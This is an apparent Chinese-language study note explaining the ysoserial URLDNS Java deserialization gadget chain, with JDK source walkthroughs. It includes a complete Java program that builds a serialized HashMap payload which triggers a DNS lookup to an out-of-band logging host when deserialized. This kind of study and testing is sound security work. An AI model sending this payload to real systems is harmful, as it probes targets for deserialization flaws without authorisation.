[TOC]

# URLDNS

URLDNS 是`ysoserial`中⼀个利用链的名字，但准确来说，这个其实不能称作“利用链”。因为其参数不是⼀个可以“利用”的命令，而仅为⼀个URL，其能触发的结果也不是命令执行，而是⼀次DNS请求。

虽然这个“利用链”实际上是不能“利用”的，但它有如下优点：

- 使用Java内置的类构造
- 对第三方库没有依赖在⽬标没有回显的时候
- 能够通过DNS请求得知是否存在反序列化漏洞。

------

#### 利用链

1. `HashMap` -> `readObject()`
2. `HashMap` -> `hash()`
3. `URL` -> `hashCode()`
4. `URLStreamHandler` -> `hashCode()`
5. `URLStreamHandler` -> `getHostAddress()`
6. `InetAddress` -> `getByName()`

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS {

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String []args) throws Exception {
        String url = "http://h1x3lu.ceye.io";

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        setFieldValue(u, "hashCode", -1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(ht);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```



#### 利用链分析

看到 URLDNS 类的 `getObject` 方法，`ysoserial` 会调用这个方法获得Payload。这个方法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 `HashMap` 。

触发反序列化的方法是 `readObject` ，因为Java开发者（包括Java内置库的开发者）经常会在这里面写自己的逻辑，所以导致可以构造利用链。

`HashMap` 类的 `readObject` 方法：

```java
    /**
     * Reconstitutes this map from a stream (that is, deserializes it).
     * @param s the stream
     * @throws ClassNotFoundException if the class of a serialized object
     *         could not be found
     * @throws IOException if an I/O error occurs
     */
    private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.min(Math.max(0.25f, lf), 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        reinitialize();

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

在结尾的地方看到将 `HashMap` 的键名计算了hash：

```java
 putVal(hash(key), key, value, false, false);
```

在此处下断点，对这个 hash 函数进行调试并跟进，这是调用栈：

> 在没有分析过的情况下，我为何会关注hash函数？因为ysoserial的注释中很明确地说明 了“During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.”，是hashCode的计算操作触 发了DNS请求。

![image-20240419230458937](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240419230458937.png)

hash 方法调用了key的 `hashCode()` 方法：

```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

URLDNS 中使用的这个key是⼀个 java.net.URL 对象，我们看看其 `hashCode` 方法：

```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

此时，handler 是 `URLStreamHandler` 对象（的某个子类对象），继续跟进其 `hashCode` 方法：

```java
    /**
     * Provides the default hash calculation. May be overidden by handlers for
     * other protocols that have different requirements for hashCode
     * calculation.
     * @param u a URL object
     * @return an {@code int} suitable for hash table indexing
     * @since 1.3
     */
    protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```

这里有调用 `getHostAddress` 方法，继续跟进：

```java
    /**
     * Returns the address of the host represented by this URL.
     * A {@link SecurityException} or an {@link UnknownHostException}
     * while getting the host address will result in this method returning
     * {@code null}
     *
     * @return an {@link InetAddress} representing the host
     */
    synchronized InetAddress getHostAddress() {
        if (hostAddress != null) {
            return hostAddress;
        }

        if (host == null || host.isEmpty()) {
            return null;
        }
        try {
            hostAddress = InetAddress.getByName(host);
        } catch (UnknownHostException | SecurityException ex) {
            return null;
        }
        return hostAddress;
    }
```

`InetAddress.getByName(host)`的作用是根据主机名，获取其IP地址，在网络上其实就是⼀次 DNS查询。到这里就不必要再跟了。

可以接受到URL查询：

![image-20240419233311917](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240419233311917.png)



# CommonsCollections